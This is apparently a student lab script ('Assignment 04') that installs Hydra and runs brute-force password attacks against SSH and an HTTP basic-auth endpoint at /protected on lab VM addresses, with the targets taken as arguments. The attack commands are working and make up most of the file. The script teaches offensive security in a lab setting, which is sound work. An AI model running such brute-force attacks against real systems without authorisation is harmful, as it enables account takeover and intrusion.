#!/bin/bash
# Assignment 04: Password Attack Simulation using Hydra (SSH and HTTP)

TARGET_SSH_IP=${1:-"10.126.134.108"}
TARGET_HTTP_IP=${2:-"10.49.183.74"}

echo "=========================================================="
echo "   Assignment 04: Password Attack Simulation (Hydra)"
echo "   SSH Target  : $TARGET_SSH_IP"
echo "   HTTP Target : $TARGET_HTTP_IP"
echo "=========================================================="

# Check and install Hydra
if ! command -v hydra &> /dev/null; then
    echo "[*] Installing Hydra..."
    sudo apt update && sudo apt install -y hydra
else
    echo "[+] Hydra is installed."
fi

echo ""
echo "=========================================================="
echo "[+] Part 1: SSH Brute-Force Password Cracking"
echo "=========================================================="
echo "[*] Step 1.1: Checking SSH port availability with 3-second timeout..."
if ! nc -z -w 3 "$TARGET_SSH_IP" 22 &>/dev/null; then
    echo "[-] Warning: SSH target $TARGET_SSH_IP:22 is not reachable."
    echo "    Make sure the Matrix-1 VM is running and on the same subnet."
    echo "    (You can pass your current target IP: ./run_demo.sh <TARGET_IP>)"
else
    echo "[+] SSH port 22 is open on $TARGET_SSH_IP."
fi

echo ""
echo "[*] Step 1.2: Launching Hydra SSH attack..."
echo "Command: hydra -L wordlist.txt -P wordlist.txt -t 4 ssh://$TARGET_SSH_IP:22"
hydra -L wordlist.txt -P wordlist.txt -t 4 "ssh://$TARGET_SSH_IP:22" || true

echo ""
echo "=========================================================="
echo "[+] Part 2: HTTP Basic Authentication Cracking"
echo "=========================================================="
echo "[*] Using focused lab dictionary: wordlist.txt (50 fast candidate passwords)"
echo "[*] Target Endpoint: http://$TARGET_HTTP_IP/protected"

if ! nc -z -w 3 "$TARGET_HTTP_IP" 80 &>/dev/null; then
    echo "[-] Notice: $TARGET_HTTP_IP:80 is not currently active."
    echo "    (If demonstrating offline, you can run the local HTTP auth service in Assignment 06!)"
else
    echo "[+] Target HTTP service is active. Running attack..."
    hydra -l bob -P wordlist.txt -t 4 "$TARGET_HTTP_IP" http-get /protected || true
fi

echo ""
echo "=========================================================="
echo "[+] Password Cracking Simulation Routine Completed."
echo "=========================================================="
